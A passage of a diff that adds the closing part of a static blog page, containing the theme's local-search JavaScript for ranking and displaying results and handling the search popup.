+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
